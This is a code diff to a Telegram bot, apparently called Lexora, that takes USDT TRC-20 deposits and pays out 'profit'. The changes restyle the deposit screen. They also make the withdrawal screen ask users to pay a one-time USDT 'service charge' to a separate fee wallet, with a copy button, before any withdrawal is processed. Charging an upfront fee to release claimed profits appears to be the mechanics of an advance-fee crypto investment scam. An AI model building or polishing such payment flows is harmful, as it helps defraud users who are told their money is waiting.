@@ -495,13 +495,13 @@ async function depositPayScreen(
     u,
     `⏳ AWAITING PAYMENT\n\n💳 DEPOSIT — USDT (TRC-20)\n\nSend exactly:\n${Number(
       dep.unique_amount,
-    ).toFixed(2)} USDT\n\nTo this address:\n${dep.wallet_address}\n\n${LINE}\n⚠️ TRON (TRC-20) only. Send the exact amount — the cents identify your payment.\n\nYour balance is credited automatically, usually within 1–3 minutes. You can close Telegram.`,
+    ).toFixed(2)} USDT\n\n⚠️ TRON (TRC-20) only. Send the exact amount — the cents identify your payment.\n\nYour balance is credited automatically, usually within 1–3 minutes. You can close Telegram.\n\n${LINE}\nDeposit wallet address:\n<code>${dep.wallet_address}</code>`,
     kb([
       [{ text: "📋 COPY DEPOSIT ADDRESS", copy: dep.wallet_address }],
       [{ text: "❌ CANCEL DEPOSIT", data: `depcancel:${dep.id}` }],
       nav(),
     ]),
-    { photo: IMG.deposit() },
+    { photo: IMG.deposit(), parseMode: "HTML" },
   );
   if (!dep.message_id && u.screen_message_id) {
     await db()
@@ -601,18 +601,23 @@ async function withdrawScreen(u: LexoraUser, s: Settings) {
   }
 
   await setUiState(u.id, { flow: "wd_address", amount: eligible });
+  const feeWallet = String(s.fee_wallet ?? "");
   await renderScreen(
     u,
     `💸 WITHDRAW PROFIT\n\n✅ Profit of at least ${usd(
       s.min_withdrawal,
     )}\n✅ Account older than ${s.withdrawal_wait_hours}h\n\nAmount:   ${usd(
       eligible,
-    )}\nNetwork:  🔴 TRON (TRC-20)\n\n${LINE}\nHOW IT WORKS\n1️⃣ Send your TRC-20 wallet address (where you receive the money).\n2️⃣ Pay the one-time ${Number(s.service_fee || 4).toFixed(
+    )}\nNetwork:  🔴 TRON (TRC-20)\nFee:      ${Number(s.service_fee || 4).toFixed(
       2,
-    )} USDT service charge — the next screen gives you the address with one-tap copy buttons.\n3️⃣ Once confirmed on the blockchain, your ${usd(
-      eligible,
-    )} is sent to your wallet.\n\n${LINE}\n⚠️ Only a USDT TRC-20 address. A wrong network means permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
-    kb([nav("wallet")]),
+    )} USDT (one-time)\n\n${LINE}\nSend your USDT TRC-20 withdrawal wallet address in this chat. You will then pay the ${Number(
+      s.service_fee || 4,
+    ).toFixed(2)} USDT service charge below before the withdrawal is processed.\n\nService-fee wallet:\n<code>${feeWallet}</code>`,
+    kb([
+      [{ text: "📋 COPY FEE ADDRESS", copy: feeWallet }],
+      nav("wallet"),
+    ]),
+    { parseMode: "HTML" },
   );
 }
 
